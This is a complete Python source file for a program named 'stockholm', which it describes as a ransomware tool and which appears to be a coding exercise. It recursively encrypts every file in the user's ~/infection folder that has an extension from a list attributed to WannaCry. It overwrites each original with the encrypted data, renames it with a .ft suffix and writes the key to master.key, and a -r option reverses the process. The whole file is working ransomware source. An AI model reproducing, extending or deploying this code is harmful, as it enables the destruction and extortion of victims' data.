# Libraries
import os, argparse
from cryptography.fernet import Fernet
from pathlib import Path

# Program
# Variables
infect = str(Path.home()) + "/infection"
folder = str(Path.home()) + "/decrypt_folder"
master_key_file = "master.key"
vers = "stockholm 1.0"
# All file extensions affected by WannaCry ransomware
exts = ['.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.accdb', '.aes', '.ai', '.arc', '.asc', 
        '.asf', '.asm', '.asp', '.asx', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c', 
        '.cab', '.cap', '.cc', '.cer', '.cfg', '.cfm', '.cgi', '.class', '.cmd', '.cpp', '.crt', '.cs', 
        '.csr', '.csv', '.db', '.dbf', '.dch', '.der', '.dif', '.dip', '.djv', '.djvu', '.doc', '.docb', 
        '.docm', '.docx', '.dot', '.dotm', '.dotx', '.dtd', '.dwg', '.edb', '.eml', '.eps', '.exe', '.f', 
        '.f4v', '.fla', '.flv', '.frm', '.gif', '.gpg', '.gz', '.h', '.hwp', '.ibd', '.iso', '.jar', '.java', 
        '.jpeg', '.jpg', '.js', '.jsp', '.key', '.lay', '.lay6', '.ldf', '.lua', '.m', '.m3u', '.m4u', '.max', 
        '.mdb', '.mdf', '.mfd', '.mid', '.mkv', '.mml', '.mov', '.mp3', '.mp4', '.mpa', '.mpeg', '.mpg', '.msg', 
        '.msi', '.myd', '.myi', '.nef', '.odb', '.odg', '.odp', '.ods', '.odt', '.ora', '.ost', '.otg', '.otp', 
        '.ots', '.ott', '.p12', '.paq', '.pas', '.pdf', '.pem', '.php', '.pl', '.png', '.pot', '.potm', '.potx', 
        '.ppam', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx', '.ps1', '.psd', '.pst', '.rar', '.raw', 
        '.rb', '.rtf', '.sch', '.sldm', '.sldx', '.slk', '.sln', '.sql', '.sqlite', '.ss', '.ssa', '.ssb', '.sxc', 
        '.sxd', '.sxi', '.sxm', '.sxw', '.tar', '.tbk', '.tgz', '.tif', '.tiff', '.txt', '.uop', '.uot', '.vb', 
        '.vbs', '.vcd', '.vdi', '.vmdk', '.vmx', '.vob', '.vsd', '.vsdx', '.wav', '.wb2', '.wk1', '.wks', '.wma', 
        '.wmv', '.xlc', '.xlm', '.xls', '.xlsb', '.xlsm', '.xlsx', '.xlt', '.xltm', '.xltx', '.xlw', '.xml', '.zip']

# Check files 
def check_file(element, form):
    if os.path.isfile(element) and element not in ["stockholm.py", "master.key"]:
        # If extension in exts, encrypt  
        if form == "c":
            for ext in exts:
                if element.endswith(ext):
                    return True            
        # If extension = .ft, decrypt                
        elif form == "d":
            if element.endswith(".ft"):
                return True
            
        else:
            if not silent:
                print("ERROR. This file is not valid for encrypt or decrypt.")
            exit()
    return False

# Check path and list
def list_content(folder):
    if os.path.isdir(folder):
        files = os.listdir(folder)

        # Check the files is not empty
        if len(files) > 0:
            list = []
            # File recursion and add files and return list
            for file in files:
                if os.path.isdir(folder + "/" + file):
                    list += list_content(folder + "/" + file)
                else:
                    list.append(folder + "/" + file)
            return list
        # If folder is not valid, return empty list
        else:
            return []
    else:
        if not silent:
            print("ERROR. Path is not a folder.")
        exit()

# Encrypt files and save with ".ft" in "infection"
def encrypt_and_save():
    files = [] 
    success = 0
    # Recursively list all files and directories within the infect folder
    for root, directories, filenames in os.walk(infect):
        for file in filenames:
            element = os.path.join(root, file)
            if check_file(element, "c"):
                files.append(element)
    # Generate symmetric key and save it in master.key
    key = Fernet.generate_key()
    with open("master.key", "wb") as f:
        f.write(key)
        
    if not silent and files:
        print("Encrypting...")

    for file in files:
        if not silent:
            print("\t{}".format(file))
        # Encrypt and save
        try:
            with open(file, "rb") as f:
                encrypt = Fernet(key).encrypt(f.read())
            with open(file, "wb") as f:
                f.write(encrypt)
            os.rename(file, file + ".ft")
            success += 1
            
        except Exception as e:
            if not silent:
                print("ERROR. Can not encrypt the file '{}'.".format(file))
    # List encrypted files
    if not silent:
        print("Encrypted files:")
        for f in sorted(files):
            print("\t{}".format(f))
        print("Finished: {0}/{1} files encrypted.".format(success, len(files)))

    return len(files)

# Decrypt and save in folder
def decrypt_and_save(folder, master_key_file):
    files = []
    success = 0

    # List the files in the infect folder and check if they can be decrypted
    for element in list_content(infect):
        if check_file(element, "d"):
            files.append(element)

    if os.path.isfile(master_key_file):
        with open(master_key_file, "rb") as f:
            master_key = f.read()
    else:
        print("Error: {} not found.".format(master_key_file))
        return 0

    # Decrypt and save files
    for file in files:
        name_file = os.path.split(file)[1]
        try:
            with open(master_key_file, "rb") as f:
                key = f.read()
            with open(file, "rb") as f:
                encrypted_data = f.read()
            decrypted_data = Fernet(key).decrypt(encrypted_data)
            if folder is None:
                folder = "decrypt_folder"
            if not os.path.exists(folder):
                os.makedirs(folder)

            decrypted_file_path = os.path.join(folder, name_file[:-3])
            with open(decrypted_file_path, "wb") as f:
                f.write(decrypted_data)

            os.remove(file)  # Remove the encrypted file

            success += 1

        except Exception:
            if not silent:
                print("ERROR: Can not decrypt file '{}'.".format(name_file))

    # If the silent flag does not work, print a summary of the files that were decrypted
    if not silent:
        print("\nDecrypted files:")
        for f in sorted(files):
            print("\t{}".format(f))
        print("Summary: {} decrypt files.".format(success))

    return len(files)

# Parser
def main():
    parser = argparse.ArgumentParser(
        prog="./stockholm",
        description="Rasomware tool.",)
    parser.add_argument("-r", metavar="key", help="Revert infection using the encryption key.",type=str)
    parser.add_argument("-v", help="Program version.", action="store_true")
    parser.add_argument("-s", help="Disable screen output.", action="store_true")
    return parser.parse_args()

# Initialize arguments
def init_args():
    parser = main()
    return parser.r, parser.v, parser.s

#

if __name__ == "__main__":
    revert, version, silent = init_args()
    if version:
        print("Versión:", vers)
    elif revert:
        if os.path.exists(revert):
           decrypt_and_save(folder, revert) 
        else:
            if not silent:
                print("Error: master.key not found.")
    else:
        if os.path.exists(infect):
            encrypt_and_save()
        else:
            if not silent:
                print("Error: '{}' does not exist.".format(infect))
